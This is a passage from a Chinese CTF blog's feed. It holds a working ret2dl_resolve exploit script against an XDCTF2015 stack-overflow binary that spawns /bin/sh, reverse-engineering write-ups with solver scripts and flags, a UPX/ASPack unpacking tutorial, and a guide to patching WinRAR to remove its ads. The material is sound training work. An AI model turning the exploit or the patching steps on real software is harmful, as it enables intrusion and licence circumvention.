main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // eax</span><br><span class="line">  char buf[4]; // [esp+0h] [ebp-6Ch]</span><br><span class="line">  char v6; // [esp+18h] [ebp-54h]</span><br><span class="line">  int *v7; // [esp+64h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);</span><br><span class="line">  memset(&amp;v6, 0, 0x4Cu);</span><br><span class="line">  setbuf(stdout, buf);</span><br><span class="line">  v3 = strlen(buf);</span><br><span class="line">  write(1, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+Ch] [ebp-6Ch]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, &amp;buf);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="正常攻击"><a href="#正常攻击" class="headerlink" title="正常攻击"></a>正常攻击</h2><h2 id="roputils"><a href="#roputils" class="headerlink" title="roputils"></a>roputils</h2><p>相对而言特别方便的工具，可以自动生成需要伪造的section，并且通过函数调用直接ROP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">r = process(&apos;./bof&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./bof&apos;)</span><br><span class="line">offset = 112</span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;相关结构&quot;&gt;&lt;a href=&quot;#相关结构&quot; class=&quot;headerlink&quot; title=&quot;相关结构&quot;&gt;&lt;/a&gt;相关结构&lt;/h1&gt;&lt;p&gt;ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。&lt;/p&gt;
&lt;p&gt;如果一个可执行文件参与动态链
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>kanxueCTF-2019</title>
    <link href="http://siriuswhiter.tk/2019/03/14/kanxuectf-2019/"/>
    <id>http://siriuswhiter.tk/2019/03/14/kanxuectf-2019/</id>
    <published>2019-03-14T13:57:23.000Z</published>
    <updated>2019-03-15T10:28:23.173Z</updated>
    
    <content type="html"><![CDATA[<p><em>刚好在学逆向，突然想着可以看一下还在比赛的看雪ctf</em></p><h1 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h1><p>win32 gui 输入注册码，错误会有提示</p><p>od 打开，搜索字符串，找到判断结果的函数位置；</p><p>ida 打开，找到od确定的函数位置，根据ida的交叉引用，找到了判断的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sub_401770      proc near               ; CODE XREF: sub_4017F0+83↓p</span><br><span class="line"></span><br><span class="line">BOOL __cdecl sub_4017F0(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; // eax</span><br><span class="line">  char Str1[28]; // [esp+D8h] [ebp-24h]</span><br><span class="line">  int v3; // [esp+F4h] [ebp-8h]</span><br><span class="line">  int v4; // [esp+F8h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  while ( *(_DWORD *)(a1 + 4 * v4) &lt; 62 &amp;&amp; *(_DWORD *)(a1 + 4 * v4) &gt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    Str1[v4] = aAbcdefghiabcde[*(_DWORD *)(a1 + 4 * v4)];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  Str1[v4] = 0;</span><br><span class="line">  if ( !strcmp(Str1, &quot;KanXueCTF2019JustForhappy&quot;) )</span><br><span class="line">    result = sub_401770();</span><br><span class="line">  else</span><br><span class="line">    result = sub_4017B0();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aAbcdefghiabcde db &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;,0</span><br></pre></td></tr></table></figure><p>可以看到就是字符串对应，直接写脚本<br>中间卡了一下就是得到的是数字位置，如19，42什么的，但是输入没法这样，出去溜了个弯，回去在od strcmp之前下了个断点，查看对输入字符串的处理，之后突然意识到可能是 0-9 a-z A-Z 对应，尝试了一下，bingo</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">b = &apos;KanXueCTF2019JustForhappy&apos;</span><br><span class="line">array = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">c = &apos;&apos; </span><br><span class="line"></span><br><span class="line">for i in range(len(b)):</span><br><span class="line">for j in range(len(a)):</span><br><span class="line">if b[i]== a[j]:</span><br><span class="line">c += array[j]</span><br><span class="line">print c</span><br></pre></td></tr></table></figure><h1 id="Repwn"><a href="#Repwn" class="headerlink" title="Repwn"></a>Repwn</h1><p>中间卡住了。。好在后面还是把解出来了哈哈哈哈，先说下目前的思路</p><p>还是先拖进od然后搜索出现的字符串，不记得是用ida还是od找到了判断入口，下断点，同时在ida中找到函数位置，反汇编，可以看到层层嵌套的判断</p><p>第一次 判断了13位，也可以因此确定其中的13位：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v1 = 8;</span><br><span class="line"> v2 = 0;</span><br><span class="line"> v8 = &apos;ruoY&apos;;</span><br><span class="line"> v9 = &apos;pnI_&apos;;</span><br><span class="line"> v10 = &apos;I_tu&apos;;</span><br><span class="line"> v11 = &apos;rW_s&apos;;</span><br><span class="line"> v12 = &apos;gno&apos;;</span><br><span class="line"> v4 = &apos;0Y1X&apos;;</span><br><span class="line"> v5 = &apos;t3Nu&apos;;</span><br><span class="line"> v6 = &apos;d00G&apos;;</span><br><span class="line"> v7 = 0;</span><br><span class="line"> while ( *((_BYTE *)&amp;v4 + v2) == *(_BYTE *)(v1 + key) )</span><br><span class="line"> &#123;</span><br><span class="line">   ++v2;</span><br><span class="line">   ++v1;</span><br><span class="line">   if ( v2 &gt; 11 )</span><br><span class="line">   &#123;</span><br><span class="line">     result = 1;</span><br><span class="line">     if ( *(_BYTE *)(key + 20) == &apos;H&apos; )</span><br><span class="line">       return result;</span><br><span class="line">     return 0;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br></pre></td></tr></table></figure></p><p>第二次,确定了序列长度，同时在检查第三步回来之后还会对最后四位处理，最后会将其覆盖到返回地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ( strlen(Str) == 24 )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( check3((int)Str) )</span><br><span class="line">   &#123;</span><br><span class="line">     Str[20] -= 88;</span><br><span class="line">     Str[21] -= 70;</span><br><span class="line">     Str[22] -= 3;</span><br><span class="line">     Str[23] -= 107;</span><br><span class="line">     strcpy(&amp;Dest, Str);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">   printf(&quot;String Length is Wrong&quot;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>第三次，也就是最后一次，，deal_8对前八位全部减0x30， 第三次通过计算可以确定第五到八位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> deal_8(a1);</span><br><span class="line">  v1 = no_4 + 1000 * fl[0] + 100 * no_2 + 10 * no_3;</span><br><span class="line">  v2 = no_6 + 10 * no_5;</span><br><span class="line">  v3 = no_8 + 10 * no_7;</span><br><span class="line"></span><br><span class="line">  if ( 2 * (v1 + v2) != 4040 || 3 * v2 / 2 + 100 * v3 != 115 )// v1+v2 = 0x7e4</span><br><span class="line">    goto LABEL_2;</span><br><span class="line">  result = 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if ( v1 - 110 * v3 != 1900 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Key_Is_Wrong,Please_Input_Again!&quot;);</span><br><span class="line">LABEL_2:</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>经过不断的尝试＋猜测，终于试出了flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20101001X1Y0uN3tG00dHaCk</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;刚好在学逆向，突然想着可以看一下还在比赛的看雪ctf&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;流浪者&quot;&gt;&lt;a href=&quot;#流浪者&quot; class=&quot;headerlink&quot; title=&quot;流浪者&quot;&gt;&lt;/a&gt;流浪者&lt;/h1&gt;&lt;p&gt;win32 gui 输入注册码，错误会有提示&lt;
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>bugku-reverse prac</title>
    <link href="http://siriuswhiter.tk/2019/03/13/bugku-reverse-prac/"/>
    <id>http://siriuswhiter.tk/2019/03/13/bugku-reverse-prac/</id>
    <published>2019-03-13T11:24:58.000Z</published>
    <updated>2019-03-13T11:54:57.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><p><em>其实是比较简单的逆向，但是毕竟上手时间短，写一写顺便把思路缕清</em></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开是dos窗口，等待输入flag，随便输入后直接退出</p><p>拖入IDA，重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 main_0()</span><br><span class="line">&#123;</span><br><span class="line">  int len; // eax</span><br><span class="line">  const char *v1; // eax</span><br><span class="line">  size_t real_len; // eax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  __int64 v4; // ST08_8</span><br><span class="line">  signed int j; // [esp-B0h] [ebp-B0h]</span><br><span class="line">  signed int i; // [esp-A4h] [ebp-A4h]</span><br><span class="line">  signed int v8; // [esp-A4h] [ebp-A4h]</span><br><span class="line">  int v9; // [esp-98h] [ebp-98h]</span><br><span class="line">  int flag; // [esp-2Ch] [ebp-2Ch]</span><br><span class="line">  int v11; // [esp-10h] [ebp-10h]</span><br><span class="line">  int v12; // [esp-4h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; 100; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)i &gt;= 0x64 )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    *((_BYTE *)&amp;v12 + i - 0x94) = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  puts_(&quot;please enter the flag:&quot;);</span><br><span class="line">  scanf(&quot;%20s&quot;, &amp;flag);</span><br><span class="line">  len = j_strlen((const char *)&amp;flag);</span><br><span class="line">  v1 = (const char *)deal((int)&amp;flag, len, (int)&amp;v11);</span><br><span class="line">  strncpy((char *)&amp;v9, v1, 40u);</span><br><span class="line">  v8 = j_strlen((const char *)&amp;v9);</span><br><span class="line">  for ( j = 0; j &lt; v8; ++j )</span><br><span class="line">    *((_BYTE *)&amp;v12 + j - 0x94) += j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  real_len = j_strlen((const char *)&amp;v9);</span><br><span class="line">  if ( !strncmp((const char *)&amp;v9, Str2, real_len) )</span><br><span class="line">    puts_(&quot;rigth flag!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts_(&quot;wrong flag!\n&quot;);</span><br><span class="line">  HIDWORD(v4) = v3;</span><br><span class="line">  LODWORD(v4) = 0;</span><br><span class="line">  return v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Str2            db &apos;e3nifIH9b_C@n@dH&apos;,0</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序流程也比较清晰，初始时将一段栈内存置为0，可以看到是在v9处，之后请求输入flag，然后对输入的flag deal加密处理<br>然后处理得到的字符串再次每位加i，相当于第二次加密，之后将其与一段字符串相比，相等的话就输出right flag</p><p>所以问题的重点其实是第一次加密是怎样处理的，ida中看到一堆abcdef…，想着可能是base64，但是不确定。</p><p>将文件拖入x32dbg 先运行起来，然后搜索字符串，找到主函数的位置，根据ida可以知道在第一次加密之后调用了strncpy，所以我们在搜索到wrong flag地址，往上翻，可以大概确定加密的地址，在其之后下断点，运行程序输入任意flag，因为约定函数返回值是存在eax中的，查看此时的eax，发现其值就是输入flag的base64，接下来写脚本就完事了</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">string=&apos;e3nifIH9b_C@n@dH&apos;</span><br><span class="line">unstring = &apos;&apos;</span><br><span class="line">for i in range(len(string)):</span><br><span class="line">unstring += chr(ord(string[i])-i)</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(unstring)</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ python lovewp.py </span><br><span class="line">&#123;i_l0ve_you&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;love&quot;&gt;&lt;a href=&quot;#love&quot; class=&quot;headerlink&quot; title=&quot;love&quot;&gt;&lt;/a&gt;love&lt;/h1&gt;&lt;p&gt;&lt;em&gt;其实是比较简单的逆向，但是毕竟上手时间短，写一写顺便把思路缕清&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Learning-unpack</title>
    <link href="http://siriuswhiter.tk/2019/03/13/reverse-learning-unpack/"/>
    <id>http://siriuswhiter.tk/2019/03/13/reverse-learning-unpack/</id>
    <published>2019-03-13T07:45:50.000Z</published>
    <updated>2019-03-13T09:03:37.042Z</updated>
    
    <content type="html"><![CDATA[<p><em>学习一下基础的软件脱壳，之后慢慢更新</em></p><h1 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h1><h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>upx属于比较经典的压缩壳，支持大多数操作系统运行文件，可以使压缩过的可执行文件体积缩小50%-70% ；</p><p>文件位压缩后的运行方式便是在压缩文件的开始加入解压缩的代码，所以程序在运行完解压缩代码之后，程序的代码实际上就与压缩前一致了，而这也是我们可以手动调试脱壳的前提。</p><h2 id="pack"><a href="#pack" class="headerlink" title="pack"></a>pack</h2><p>先下载 <a href="https://upx.github.io/" target="_blank" rel="noopener">upx</a></p><p>od 查看文件在upx 之前的内存情况，从开始处，信息比较清楚</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/1.png" alt="未加壳" title="" class="">                <p>未加壳</p>            </figure><p>命令行调用upx 给文件加壳   <code>./upx.exe filename.exe</code></p><p>再次查看文件情况，当然也可以使用IDA。</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/2.png" alt="加壳" title="" class="">                <p>加壳</p>            </figure><h2 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h2><ol><li>upx自带脱壳命令，加个-d 就是脱壳模式</li><li>手动脱壳</li></ol><p>文件起始有个pushad将所有寄存器的值入栈，之后从加壳后的文件起始处按f8单步往后走，发现不久后就开始了反复循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">004079D0   &gt; /8A06          mov al,byte ptr ds:[esi]</span><br><span class="line">004079D2   . |46            inc esi                                  ;  upxpacke.00407006</span><br><span class="line">004079D3   . |8807          mov byte ptr ds:[edi],al</span><br><span class="line">004079D5   . |47            inc edi                                  ;  upxpacke.00401002</span><br><span class="line">004079D6   &gt; |01DB          add ebx,ebx</span><br><span class="line">004079D8   . |75 07         jnz short upxpacke.004079E1</span><br><span class="line">004079DA   &gt; |8B1E          mov ebx,dword ptr ds:[esi]</span><br><span class="line">004079DC   . |83EE FC       sub esi,-0x4</span><br><span class="line">004079DF   . |11DB          adc ebx,ebx</span><br><span class="line">004079E1   &gt;^\72 ED         jb short upxpacke.004079D0</span><br></pre></td></tr></table></figure><p>可以看到大概意思就是在疯狂复制esi地址的数据到 edi地址处</p><p>而我们只需要找到之后的popad就可以了，所以右键-&gt;serch for-&gt;command 或直接 ctrl+F 寻找popad ，不过这里需要去掉entire block的勾选，否则会找到起始地址之前的popad，找到之后f2下断点，f9直接运行到这里</p><p>之后继续单步,一个小循环之后，跳转到一个地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00407B66   .  61            popad</span><br><span class="line">00407B67   .  8D4424 80     lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">00407B6B   &gt;  6A 00         push 0x0</span><br><span class="line">00407B6D   .  39C4          cmp esp,eax</span><br><span class="line">00407B6F   .^ 75 FA         jnz short upxpacke.00407B6B</span><br><span class="line">00407B71   .  83EC 80       sub esp,-0x80</span><br><span class="line">00407B74   .- E9 C897FFFF   jmp upxpacke.00401341</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00401341    E8 83040000     call upxpacke.004017C9</span><br><span class="line">00401346  ^ E9 B3FDFFFF     jmp upxpacke.004010FE</span><br><span class="line">0040134B    8BFF            mov edi,edi                              ; upxpacke.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0040134D    55              push ebp</span><br><span class="line">0040134E    8BEC            mov ebp,esp</span><br><span class="line">00401350    81EC 28030000   sub esp,0x328</span><br></pre></td></tr></table></figure><p>到达该地址后，可以看到有个call函数，此时就可以使用od 的插件OllyDump将文件脱壳，需要注意的是重建输入表一般会选择方式二，其他的可以根据情况来定，这次保持默认就可以了</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/3.png" alt="ollydump" title="" class="">                <p>ollydump</p>            </figure><p>打开输出的脱壳的文件，找到最初始的地方，发现与脱壳前一样，也就是说脱壳成功</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/4.png" alt="脱壳效果" title="" class="">                <p>脱壳效果</p>            </figure><h1 id="aspack"><a href="#aspack" class="headerlink" title="aspack"></a>aspack</h1><h2 id="type-1"><a href="#type-1" class="headerlink" title="type"></a>type</h2><p>专门针对win32程序的压缩软件，整体原理与upx差不多所以方法实际上是可以通用的。</p><h2 id="unpack-1"><a href="#unpack-1" class="headerlink" title="unpack"></a>unpack</h2><p>aspack popad不容易找到，所以可以使用其他的办法来</p><p>这里可以确定0x401000是程序本身的初始位置，只是在没有解包之前，这里还无法反汇编。</p><p>我们这里使用硬件断点(硬件断点不通过0xCC/<em>int 3h</em>/中断程序运行并向调试器发送报告，而是通过写入DR寄存器来实现；其支持更复杂的中断，但是只能设置四个)，在0x401000处设置一个硬件断点，f9运行，程序到0x401000处停止执行，此时应该已经解包完成，如果没有显示的话按ctrl+A， 使得OD重新分析代码即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;学习一下基础的软件脱壳，之后慢慢更新&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;upx&quot;&gt;&lt;a href=&quot;#upx&quot; class=&quot;headerlink&quot; title=&quot;upx&quot;&gt;&lt;/a&gt;upx&lt;/h1&gt;&lt;h2 id=&quot;type&quot;&gt;&lt;a href=&quot;#type&quot; clas
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Learning-Practical practice</title>
    <link href="http://siriuswhiter.tk/2019/03/12/reverse-learning-practical-practice/"/>
    <id>http://siriuswhiter.tk/2019/03/12/reverse-learning-practical-practice/</id>
    <published>2019-03-12T14:23:42.000Z</published>
    <updated>2019-03-13T07:54:16.887Z</updated>
    
    <content type="html"><![CDATA[<p><em>这是之前l3c战队逆向的新手训练，本来想以后再搞，但最近又被最为任务下发了，菜的不行，上周什么也没干成，挣扎了一周。还是决定慢慢学习逆向</em></p><h1 id="winRAR-去除广告"><a href="#winRAR-去除广告" class="headerlink" title="winRAR 去除广告"></a>winRAR 去除广告</h1><p>  拿x64dbg做调试器来达到理解原理并去除广告</p><ol><li><p>打开WinRAR，发现开始就有广告弹出；</p></li><li><p>使用x64dbg打开WinRAR，按f9直到程序完全加载，即程序看上去就和普通打开时一样；</p><figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/1.png" alt="初始状态" title="" class="">                <p>初始状态</p>            </figure></li></ol><ol start="3"><li>命令行输入 bp DestroyWindow  命令，意思就是在DestroyWindow处下断点，然后关掉广告，调试器会停在断点处；<figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/2.png" alt="断点状态" title="" class="">                <p>断点状态</p>            </figure></li></ol><ol start="4"><li>通过栈回溯到调用destroywindow 函数的地方，往上翻找到消息的开头(关于找到广告窗口子函数的开头，可以向上翻，也可以将其地址减去基址/<em>x64dbg在符号中可以看到基址</em>/得到偏移，将其放入IDA，加上IDA基址，找到函数模块，从而确定开头位置)，将其直接跳转至关闭广告窗口；<figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/3.png" alt="函数起始" title="" class="">                <p>函数起始</p>            </figure></li></ol><ol start="5"><li>保存patch即可。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;这是之前l3c战队逆向的新手训练，本来想以后再搞，但最近又被最为任务下发了，菜的不行，上周什么也没干成，挣扎了一周。还是决定慢慢学习逆向&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;winRAR-去除广告&quot;&gt;&lt;a href=&quot;#winRAR-去除广告&quot; class=&quot;head
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>0ctf-2018-pwn</title>
    <link href="http://siriuswhiter.tk/2019/03/11/0ctf-2018-pwn/"/>
    <id>http://siriuswhiter.tk/2019/03/11/0ctf-2018-pwn/</id>
    <published>2019-03-11T07:09:35.000Z</published>
    <updated>2019-04-18T12:32:13.487Z</updated>
    
